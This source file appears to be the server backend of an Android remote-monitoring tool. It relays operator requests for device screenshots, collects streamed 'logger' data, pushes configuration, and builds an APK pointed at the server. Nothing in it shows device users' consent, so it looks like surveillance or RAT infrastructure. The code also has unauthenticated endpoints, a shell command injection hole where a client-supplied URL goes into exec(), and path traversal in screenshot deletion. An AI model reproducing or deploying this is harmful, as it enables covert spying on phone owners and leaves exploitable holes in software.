import { Server } from "socket.io";
import chalk from "chalk";
import fs from "fs/promises";
import { exec } from 'child_process';
import crypto from 'crypto';

import { db } from './db.js';

// Generate hash for config comparison
function generateConfigHash(config) {
    if (!config || !config.server_url) return null;
    const configString = JSON.stringify({
        server_url: config.server_url,
        screenshot_quality: config.screenshot_quality || 70,
        auto_screenshot: config.auto_screenshot !== undefined ? config.auto_screenshot : true
    });
    return crypto.createHash('sha256').update(configString).digest('hex');
}

// Generate device config from default config
async function generateDeviceConfig(deviceUuid) {
    try {
        // Check if config already exists for this device
        let deviceConfig = await db.getDeviceConfig(deviceUuid);

        console.log(chalk.cyan(`[DEBUG] generateDeviceConfig for ${deviceUuid}: deviceConfig =`, deviceConfig));

        if (deviceConfig) {
            // If exists, return existing config
            console.log(chalk.cyan(`[DEBUG] Using device-specific config: ${deviceConfig.server_url}`));
            return {
                server_url: deviceConfig.server_url,
                screenshot_quality: deviceConfig.screenshot_quality,
                auto_screenshot: deviceConfig.auto_screenshot === 1
            };
        }

        // If not exists, generate from default config
        const defaultConfig = await db.getDefaultConfig();
        console.log(chalk.cyan(`[DEBUG] defaultConfig =`, defaultConfig));

        if (!defaultConfig) {
            console.log(chalk.yellow(`[!] Cannot generate config for device ${deviceUuid}: default config not found`));
            return null;
        }

        // Save new config to DB
        await db.upsertDeviceConfig(
            deviceUuid,
            defaultConfig.server_url,
            defaultConfig.screenshot_quality,
            defaultConfig.auto_screenshot
        );

        console.log(chalk.blue(`[i] Generated config for device ${deviceUuid} from default config`));

        return {
            server_url: defaultConfig.server_url,
            screenshot_quality: defaultConfig.screenshot_quality,
            auto_screenshot: defaultConfig.auto_screenshot === 1
        };
    } catch (error) {
        console.error('Error generating device config:', error);
        return null;
    }
}

const devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
const pendingScreenshotResponses = new Map(); // Map<request_id, {device_uuid, timeout}>

/**
 * Helper function to save a screenshot image to disk
 * @param {Buffer} imageBuffer - The image data as Buffer
 * @param {string} deviceUuid - The device UUID
 * @returns {Promise<string>} - The filename if successful, null otherwise
 */
async function saveScreenshot(imageBuffer, deviceUuid) {
    try {
        if (!imageBuffer || imageBuffer.length === 0) {
            return null;
        }

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `screenshot-${deviceUuid}-${timestamp}.jpg`;
        const filepath = `screenshots/${filename}`;

        await fs.mkdir('screenshots', { recursive: true });
        await fs.writeFile(filepath, imageBuffer);

        console.log(`Screenshot saved: screenshots/${filename}`);
        return filename;
    } catch (error) {
        console.error('Error saving screenshot:', error);
        return null;
    }
}

// Socket.io server
const io = new Server(8080, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Socket.io namespace for frontend connections
const frontendIo = io.of('/frontend');

// Socket io Connection for Android devices
const androidIo = io.of('/android');

androidIo.on("connection", async (socket) => {
    const clientIp = getClientIp(socket);
    console.log(chalk.cyan(`[i] New connection attempt from ${clientIp}`));

    try {
        const dataStr = socket.handshake.query.info;
        const clientConfigHash = socket.handshake.query.config_hash; // Client sends its current config hash

        if (!dataStr) {
            console.log(chalk.red(`[!] No 'info' query param in handshake - disconnecting`));
            socket.disconnect();
            return;
        }

        let data;
        try {
            data = JSON.parse(dataStr);
        } catch (e) {
            console.log(chalk.red(`[!] Failed to parse JSON from 'info' param: ${e.message}`));
            socket.disconnect();
            return;
        }

        const deviceUuid = data.device_uuid;
        if (!deviceUuid) {
            console.log(chalk.red(`[!] 'device_uuid' missing in info data - disconnecting`));
            socket.disconnect();
            return;
        }

        console.log(chalk.green(`[+] Device ${deviceUuid} validated @ ${clientIp}`));

        socket.deviceUuid = deviceUuid;

        let device = devices.get(deviceUuid);
        if (device) {
            device.info = data;
            device.socket = socket;
            // Clean up any stale screenshot responses for this device
            for (const [requestId, request] of pendingScreenshotResponses.entries()) {
                if (request.device_uuid === deviceUuid) {
                    clearTimeout(request.timeout);
                    pendingScreenshotResponses.delete(requestId);
                    console.log(chalk.yellow(`Cleaned up stale screenshot response for reconnected device ${deviceUuid}`));
                }
            }
            if (!device.logs) {
                device.logs = [];
            }
        } else {
            console.log(chalk.cyan(`[DIAGNOSTIC] Device ${deviceUuid} is new, creating new entry in map`));
            device = {
                info: data,
                socket: socket,
                logs: []
            };
            devices.set(deviceUuid, device);
        }

        // UPSERT device info in DB
        await db.run(
            'INSERT OR REPLACE INTO devices (device_uuid, brand, model, manufacturer, connected_at, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
            deviceUuid, data.Brand, data.Model, data.Manufacturer, Date.now(), Date.now()
        ).catch(console.error);

        // Compare client config hash with server config
        const deviceConfig = await generateDeviceConfig(deviceUuid);
        if (deviceConfig) {
            const serverConfigHash = generateConfigHash(deviceConfig);
            console.log(chalk.cyan(`[DEBUG] Client hash: ${clientConfigHash}, Server hash: ${serverConfigHash}`));

            if (!clientConfigHash || clientConfigHash !== serverConfigHash) {
                // Config changed or first connection - send new config
                socket.emit("config_data", deviceConfig);
                console.log(chalk.blue(`[i] Sent config to device ${deviceUuid} (hash mismatch):`, JSON.stringify(deviceConfig)));
            } else {
                // Config unchanged - no need to send
                console.log(chalk.blue(`[i] Config unchanged for device ${deviceUuid} - skipping emission`));
            }
        } else {
            console.log(chalk.yellow(`[!] Cannot send config to device ${deviceUuid}: server_url is null in default config`));
        }

        // Broadcast updated device list to frontend
        const deviceList = Array.from(devices.values()).map((d) => ({
            ...d.info,
            ID: d.info.device_uuid
        })).slice(0, 20);
        frontendIo.emit("devices", deviceList);

        socket.on("disconnect", async (reason) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) {
                console.log(chalk.yellow(`[!] Device disconnected without UUID (reason: ${reason})`));
                return;
            }

            console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Reason: ${reason}`));
            console.log(chalk.cyan(`[DIAGNOSTIC] Device ${deviceUuid} disconnect details:`));
            console.log(chalk.cyan(`  - Socket id: ${socket.id}`));
            console.log(chalk.cyan(`  - Socket connected: ${socket.connected}`));
            console.log(chalk.cyan(`  - Disconnect reason: ${reason}`));
            console.log(chalk.cyan(`  - Devices in map before cleanup: ${devices.size}`));

            const currentDeviceInMap = devices.get(deviceUuid);

            // Solo procedemos a limpiar si el socket que se desconecta 
            // es exactamente el mismo que tenemos activo en el mapa.
            if (currentDeviceInMap && currentDeviceInMap.socket.id === socket.id) {

                console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Clean Exit`));

                // Clean up any pending screenshot responses for this device
                for (const [requestId, request] of pendingScreenshotResponses.entries()) {
                    if (request.device_uuid === deviceUuid) {
                        clearTimeout(request.timeout);
                        // Broadcast error to all frontends
                        frontendIo.emit("screenshot_error", {
                            device_uuid: deviceUuid,
                            error: "Device disconnected while taking screenshot"
                        });
                        pendingScreenshotResponses.delete(requestId);
                    }
                }

                // Ahora sí, borrar del mapa con seguridad
                devices.delete(deviceUuid);

                // Update last_seen in DB
                await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);

                // Broadcast updated device list
                const deviceList = Array.from(devices.values()).map((d) => ({
                    ...d.info,
                    ID: d.info.device_uuid
                })).slice(0, 20);
                frontendIo.emit("devices", deviceList);

            } else {
                // Si entramos aquí, es una desconexión de un socket "fantasma" o antiguo
                console.log(chalk.yellow(`[i] Stale socket disconnected for ${deviceUuid} (ID: ${socket.id}). Ignoring cleanup to preserve new connection.`));
            }
        });

        // Handle logger events from Android device
        socket.on("logger", async (data) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) return;

            // DIAGNOSTIC LOG: Verificar estado del socket cuando llega evento logger
            console.log(chalk.cyan(`[DIAGNOSTIC] Logger event received from device ${deviceUuid}`));
            console.log(chalk.cyan(`  - Socket id: ${socket.id}`));
            console.log(chalk.cyan(`  - Socket connected: ${socket.connected}`));
            console.log(chalk.cyan(`  - Data: ${typeof data === 'string' ? data.substring(0, 100) : 'binary'}`));

            // Check if this is a screenshot failure response
            if (data && typeof data === 'string' && data.includes("Screenshot failed")) {
                // Find and clear any pending screenshot requests for this device
                for (const [requestId, request] of pendingScreenshotResponses.entries()) {
                    if (request.device_uuid === deviceUuid) {
                        clearTimeout(request.timeout);
                        pendingScreenshotResponses.delete(requestId);
                        console.log(chalk.yellow(`Cleared pending screenshot request ${requestId} for device ${deviceUuid} due to screenshot failure`));
                    }
                }
            }

            try {
                let device = devices.get(deviceUuid);
                if (!device) {
                    console.log(chalk.yellow(`[!] Received logger data from unknown device ${deviceUuid}, ignoring`));
                    return;
                }

                // Update device last seen
                device.lastSeen = Date.now();

                console.log(chalk.green(`[i] Logger event from device ${deviceUuid}: ${data}`));

                // Store in logs and emit to frontend
                device.logs.push({ timestamp: Date.now(), log: data });
                frontendIo.emit("logger", { device: deviceUuid, log: data });

                // Store in DB
                const today = new Date().toISOString().split('T')[0];
                const row = await db.get('SELECT logs_data FROM device_daily_logs WHERE device_uuid = ? AND date = ?', deviceUuid, today);
                let existingLogs = row?.logs_data || '[]';
                const logsArray = JSON.parse(existingLogs);
                logsArray.push({ timestamp: Date.now(), log: data });

                await db.run(
                    'INSERT OR REPLACE INTO device_daily_logs (device_uuid, date, logs_data, updated_at) VALUES (?, ?, ?, ?)',
                    deviceUuid, today, JSON.stringify(logsArray), Date.now()
                );
            } catch (err) {
                console.error('Logger storage error:', err);
            }
        });

        // Handle screenshot response from Android device
        socket.on("screenshot_response", async (...args) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) return;

            console.log(chalk.green(`[+] Screenshot response received from device ${deviceUuid}`));

            try {
                let buffer;
                let requestId = null;

                // Handle two separate parameters: request_id and imageData
                if (args.length === 2 && typeof args[0] === 'string') {
                    requestId = args[0];
                    const imageData = args[1];

                    // Socket.io ya convirtió el byte[] de Java en un Buffer de Node
                    if (Buffer.isBuffer(imageData)) {
                        buffer = imageData;
                    } else {
                        throw new Error('Expected Buffer, got ' + typeof imageData);
                    }
                } else if (args.length === 1) {
                    // Single parameter - direct binary data
                    const data = args[0];
                    if (Buffer.isBuffer(data)) {
                        buffer = data;
                    } else {
                        throw new Error('Expected binary, got ' + typeof data);
                    }
                } else {
                    throw new Error('Unexpected number of arguments: ' + args.length);
                }

                if (!buffer || buffer.length === 0) {
                    throw new Error('Empty image data');
                }

                console.log(chalk.green(`[+] Screenshot received from device ${deviceUuid}, size: ${buffer.length} bytes`));

                // Update device last seen
                const device = devices.get(deviceUuid);
                if (device) {
                    device.lastSeen = Date.now();
                }

                // Save screenshot using helper function
                const filename = await saveScreenshot(buffer, deviceUuid);
                if (!filename) {
                    throw new Error('Failed to save screenshot');
                }
                if (requestId && pendingScreenshotResponses.has(requestId)) {
                    const request = pendingScreenshotResponses.get(requestId);
                    clearTimeout(request.timeout);
                    pendingScreenshotResponses.delete(requestId);
                    console.log(chalk.cyan(`[DIAGNOSTIC] Cleared pending request ${requestId}`));
                } else if (requestId) {
                    console.log(chalk.yellow(`[DIAGNOSTIC] Request ${requestId} not found in pending responses`));
                }

                // Always broadcast to all frontends
                console.log(chalk.green(`[✓] Screenshot ready for device ${deviceUuid}, broadcasting to all frontends`));
                frontendIo.emit("screenshot_ready", {
                    device_uuid: deviceUuid,
                    filename: filename,
                    timestamp: Date.now()
                });

                console.log(`Screenshot saved: screenshots/${filename}`);
            } catch (err) {
                console.error('Screenshot response error:', err);
                frontendIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
            }
        });
    } catch (error) {
        console.error('Error handling device connection:', error);
        socket.disconnect();
    }
});

const getClientIp = (socket) => {
    const remoteAddress = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    if (!remoteAddress) return '0.0.0.0';

    let ip = remoteAddress.split(',')[0].trim();

    if (ip.includes('::ffff:')) {
        ip = ip.split(':').pop();
    }
    return ip;
};

// Socket io Connection for Frontend
frontendIo.on("connection", async (socket) => {
    console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id})`))

    try {
        const deviceList = Array.from(devices.values()).map((d) => ({
            ...d.info,
            ID: d.info.device_uuid
        })).slice(0, 20);
        socket.emit("devices", deviceList);
    } catch (error) {
        console.error('Error sending initial device list to frontend:', error);
        socket.emit("devices", []);
    }

    socket.on("screenshot_req", async (deviceId) => {
        deviceId = (typeof deviceId === 'string' ? deviceId.trim() : deviceId);
        if (!deviceId || deviceId === 'None') {
            console.log(chalk.red(`Screenshot request with invalid/None deviceId`));
            socket.emit("screenshot_error", { device_uuid: deviceId, error: "Invalid device ID" });
            return;
        }

        console.log(`Relaying screenshot request to device: ${deviceId} from frontend: ${socket.id}`);

        try {
            let device = devices.get(deviceId);

            if (device && !device.socket) {
                const fallback = Array.from(devices.values()).find((d) => d.info && d.info.device_uuid === deviceId && d.socket);
                if (fallback) {
                    device = fallback;
                    devices.set(deviceId, fallback);
                }
            }

            if (device && device.socket) {

                // Generate unique request_id and store mapping
                const requestId = `${deviceId}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
                pendingScreenshotResponses.set(requestId, {
                    device_uuid: deviceId,
                    timeout: setTimeout(async () => {
                        console.log(chalk.red(`Screenshot response timeout for request ${requestId}, broadcasting to all frontends`));
                        const request = pendingScreenshotResponses.get(requestId);
                        if (request) {
                            frontendIo.emit("screenshot_error", {
                                device_uuid: deviceId,
                                error: "Screenshot response timed out"
                            });
                            pendingScreenshotResponses.delete(requestId);
                        }
                    }, 10000)
                });

                // Send request_id to device
                device.socket.emit("screenshot", { request_id: requestId });
                console.log(chalk.green(`Screenshot request sent to device ${deviceId} with request_id ${requestId}`));
            } else {
                console.log(chalk.red(`Device ${deviceId} not found or socket disconnected`));
                socket.emit("screenshot_error", { device_uuid: deviceId, error: "Device not available" });
            }
        } catch (error) {
            console.error('Error handling screenshot request:', error);
            socket.emit("screenshot_error", { device_uuid: deviceId, error: "Internal server error" });
        }
    });

    socket.on("get_device_info", async (deviceId) => {
        if (!deviceId) {
            socket.emit("device_info_error", { error: "Invalid device ID" });
            return;
        }

        try {
            const device = devices.get(deviceId);
            if (device) {
                socket.emit("device_info", device.info);
            } else {
                socket.emit("device_info_error", { error: "Device not found" });
            }
        } catch (error) {
            console.error('Error getting device info:', error);
            socket.emit("device_info_error", { error: "Internal server error" });
        }
    });

    socket.on("get_device_logs", async (deviceId) => {
        if (!deviceId) {
            console.log(chalk.yellow(`[!] get_device_logs called with invalid deviceId`));
            return;
        }

        try {
            console.log(chalk.cyan(`[i] Fetching logs for device ${deviceId}`));

            // Get logs from database for the last 7 days
            const rows = await db.all(
                'SELECT date, logs_data FROM device_daily_logs WHERE device_uuid = ? ORDER BY date DESC LIMIT 7',
                deviceId
            );

            let allLogs = [];
            for (const row of rows) {
                try {
                    const logsArray = JSON.parse(row.logs_data || '[]');
                    // Convert each log entry to a string format
                    for (const logEntry of logsArray) {
                        if (logEntry.log) {
                            allLogs.push(logEntry.log);
                        }
                    }
                } catch (parseError) {
                    console.error(`Error parsing logs for date ${row.date}:`, parseError);
                }
            }

            console.log(chalk.green(`[+] Sending ${allLogs.length} logs for device ${deviceId}`));
            socket.emit("device_logs", allLogs);
        } catch (error) {
            console.error('Error getting device logs:', error);
            socket.emit("device_logs", []);
        }
    });

    socket.on("validate_config", () => {
        console.log(chalk.cyan(`[i] Restart request received via WS from frontend ${socket.id}`));

        try {
            androidIo.emit("restart", { timestamp: Date.now() });
            frontendIo.emit("restart", { timestamp: Date.now() });
            socket.emit("restart_response", { success: true, message: 'Restart request sent' });
        } catch (error) {
            console.error('Restart request error:', error);
            socket.emit("restart_response", { success: false, error: error.message });
        }
    });

    socket.on("get_screenshots", async (deviceId) => {
        try {
            const screenshotsDir = 'screenshots';
            await fs.mkdir(screenshotsDir, { recursive: true });

            const files = await fs.readdir(screenshotsDir);
            let screenshotFiles = files
                .filter(file => file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.png'))
                .map(file => {
                    const match = file.match(/^screenshot-(.+)-(\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}-\d{3}Z)\.jpg$/);
                    if (match) {
                        const [, deviceUuid, timestampStr] = match;
                        const timestamp = new Date(timestampStr.replace(/T(\d{2})-(\d{2})-(\d{2})-(\d{3})Z$/, 'T$1:$2:$3.$4Z'));
                        return {
                            filename: file,
                            device_uuid: deviceUuid,
                            timestamp: timestamp.getTime(),
                            url: `/screenshots/${file}`
                        };
                    }
                    return null;
                })
                .filter(item => item !== null);

            if (deviceId && deviceId !== "None") {
                screenshotFiles = screenshotFiles.filter(item => item.device_uuid === deviceId);
            }

            screenshotFiles.sort((a, b) => b.timestamp - a.timestamp);
            socket.emit("screenshots_list", screenshotFiles);
        } catch (error) {
            console.error('Error getting screenshots list:', error);
            socket.emit("screenshots_list", []);
        }
    });

    socket.on("delete_screenshot", async (filename) => {
        try {
            const filepath = `screenshots/${filename}`;
            await fs.unlink(filepath);
            console.log(`Screenshot deleted: ${filepath}`);
            socket.emit("delete_screenshot_success", { filename });
        } catch (error) {
            console.error('Error deleting screenshot:', error);
            socket.emit("delete_screenshot_error", { filename, error: error.message });
        }
    });

    // Helper function to ensure server URL has correct namespace
    function appendAndroidNameSpace(url) {
        if (!url.endsWith('/')) {
            url += '/';
        }
        if (!url.endsWith('/android/')) {
            url += 'android';
        }
        return url;
    }

    socket.on("build_request", async (data) => {
        const { serverUrl } = data;
        console.log(`Build request for URL: ${serverUrl}`);
        const androidUrl = appendAndroidNameSpace(serverUrl);
        console.log(`Using Android URL: ${androidUrl}`);
        frontendIo.emit("build_started", { androidUrl });

        const command = `cd /android-project && ./gradlew assembleRelease -PserverUrl='${androidUrl}' --no-daemon --stacktrace`;

        exec(command, { cwd: '/android-project' }, (error, stdout, stderr) => {
            if (error) {
                console.error(`Build error: ${error.message}`);
                console.error(`Stderr: ${stderr}`);
                socket.emit("build_error", { success: false, error: error.message, stderr });
                return;
            }
            console.log(`Build successful: ${stdout}`);
            socket.emit("build_success", { success: true });
        });
    });

    socket.on("download_apk", async () => {
        const apkPath = '/android-project/app/build/outputs/apk/release/app-release.apk';

        try {
            const buffer = await fs.readFile(apkPath);
            socket.emit("apk_data", buffer);
            console.log(`APK sent to frontend ${socket.id}`);
        } catch (error) {
            console.error(`Error reading APK: ${error.message}`);
            socket.emit("apk_error", { error: "APK not found or build not completed" });
        }
    });

    // Default config events
    socket.on("get_default_config", async () => {
        try {
            const defaultConfig = await db.getDefaultConfig();
            if (!defaultConfig) {
                socket.emit("default_config_error", { error: 'Default config not found' });
                return;
            }
            socket.emit("default_config_data", defaultConfig);
        } catch (error) {
            console.error('Error getting default config:', error);
            socket.emit("default_config_error", { error: error.message });
        }
    });

    socket.on("update_default_config", async (data) => {
        try {
            const { server_url, screenshot_quality, auto_screenshot } = data;

            // Validations
            if (!server_url || typeof server_url !== 'string') {
                throw new Error('Invalid server_url');
            }
            if (screenshot_quality < 1 || screenshot_quality > 100) {
                throw new Error('screenshot_quality must be between 1 and 100');
            }

            // Check if default config exists
            const existingConfig = await db.getDefaultConfig();
            if (existingConfig) {
                // Update existing config
                await db.updateDefaultConfig(server_url, screenshot_quality, auto_screenshot);
                console.log(chalk.green(`[+] Default config updated by frontend ${socket.id}`));
            } else {
                // Create new config
                await db.run(
                    'INSERT INTO default_config (id, server_url, screenshot_quality, auto_screenshot) VALUES (1, ?, ?, ?)',
                    server_url, screenshot_quality, auto_screenshot ? 1 : 0
                );
                console.log(chalk.green(`[+] Default config created by frontend ${socket.id}`));
            }

            socket.emit("default_config_updated", { success: true });

            // Notify all frontends
            frontendIo.emit("default_config_changed", {
                server_url,
                screenshot_quality,
                auto_screenshot
            });
        } catch (error) {
            console.error('Error updating default config:', error);
            socket.emit("default_config_error", { error: error.message });
        }
    });

    socket.on("broadcast_default_config", async () => {
        try {
            console.log(chalk.cyan(`[i] Broadcast default config request received from frontend ${socket.id}`));

            // Get default config from database
            const defaultConfig = await db.getDefaultConfig();
            if (!defaultConfig) {
                socket.emit("default_config_error", { error: 'Default config not found' });
                return;
            }

            const configToSend = {
                server_url: defaultConfig.server_url,
                screenshot_quality: defaultConfig.screenshot_quality,
                auto_screenshot: defaultConfig.auto_screenshot === 1
            };

            // Update all device configs in database with default config
            const allDeviceConfigs = await db.getAllDeviceConfigs();
            for (const deviceConfig of allDeviceConfigs) {
                await db.upsertDeviceConfig(
                    deviceConfig.device_uuid,
                    defaultConfig.server_url,
                    defaultConfig.screenshot_quality,
                    defaultConfig.auto_screenshot
                );
            }
            console.log(chalk.blue(`[i] Updated ${allDeviceConfigs.length} device configs in database`));

            console.log(chalk.green(`[+] Default config to broadcast: ${JSON.stringify(configToSend)}`));
            // Broadcast to all connected Android devices
            androidIo.emit("config_data", configToSend);

            console.log(chalk.green(`[+] Default config broadcasted to all Android devices`));
            socket.emit("default_config_broadcasted", { success: true });
        } catch (error) {
            console.error('Error broadcasting default config:', error);
            socket.emit("default_config_error", { error: error.message });
        }
    });

    // Device config events
    socket.on("get_device_config", async (deviceUuid) => {
        try {
            const config = await db.getDeviceConfig(deviceUuid);
            if (config) {
                socket.emit("device_config_data", {
                    device_uuid: deviceUuid,
                    ...config,
                    auto_screenshot: config.auto_screenshot === 1
                });
            } else {
                // If not exists, generate from default config
                const generatedConfig = await generateDeviceConfig(deviceUuid);
                if (!generatedConfig) {
                    socket.emit("device_config_error", { error: 'Cannot reset: no default config found' });
                    return;
                }
                socket.emit("device_config_data", {
                    device_uuid: deviceUuid,
                    ...generatedConfig
                });
            }
        } catch (error) {
            console.error('Error getting device config:', error);
            socket.emit("device_config_error", { error: error.message });
        }
    });

    socket.on("update_device_config", async (data) => {
        try {
            const { device_uuid, server_url, screenshot_quality, auto_screenshot } = data;

            console.log(chalk.cyan(`[DEBUG] update_device_config received for ${device_uuid}: server_url = ${server_url}`));

            // Validations
            if (!device_uuid) {
                throw new Error('device_uuid is required');
            }
            if (!server_url || typeof server_url !== 'string') {
                throw new Error('Invalid server_url');
            }
            if (screenshot_quality < 1 || screenshot_quality > 100) {
                throw new Error('screenshot_quality must be between 1 and 100');
            }

            // Update config in DB
            await db.upsertDeviceConfig(
                device_uuid,
                server_url,
                screenshot_quality,
                auto_screenshot
            );

            // Verify it was saved
            const savedConfig = await db.getDeviceConfig(device_uuid);
            console.log(chalk.cyan(`[DEBUG] Config after save:`, savedConfig));

            console.log(chalk.green(`[+] Config updated for device ${device_uuid} by frontend ${socket.id}`));
            socket.emit("device_config_updated", { success: true, device_uuid });

            // If device is connected, send new config
            const device = devices.get(device_uuid);
            if (device && device.socket) {
                const newConfig = {
                    server_url,
                    screenshot_quality,
                    auto_screenshot
                };
                device.socket.emit("config_data", newConfig);
                console.log(chalk.blue(`[i] Sent updated config to device ${device_uuid}`));
            }
        } catch (error) {
            console.error('Error updating device config:', error);
            socket.emit("device_config_error", { error: error.message });
        }
    });

    socket.on("reset_device_config", async (deviceUuid) => {
        try {
            if (!deviceUuid) {
                throw new Error('device_uuid is required');
            }

            // Delete custom config
            await db.deleteDeviceConfig(deviceUuid);

            // Regenerate from default config
            const newConfig = await generateDeviceConfig(deviceUuid);

            if (!newConfig) {
                socket.emit("device_config_error", { error: 'Cannot reset: no default config found' });
                return;
            }

            console.log(chalk.green(`[+] Config reset to default for device ${deviceUuid}`));
            socket.emit("device_config_reset", { success: true, device_uuid: deviceUuid });

            // If device is connected, send new config
            const device = devices.get(deviceUuid);
            if (device && device.socket) {
                device.socket.emit("config_data", newConfig);
                console.log(chalk.blue(`[i] Sent reset config to device ${deviceUuid}`));
            }
        } catch (error) {
            console.error('Error resetting device config:', error);
            socket.emit("device_config_error", { error: error.message });
        }
    });

    socket.on("disconnect", () => {
        console.log(chalk.red(`[x] Frontend Disconnected (${socket.id})`))
    });
});
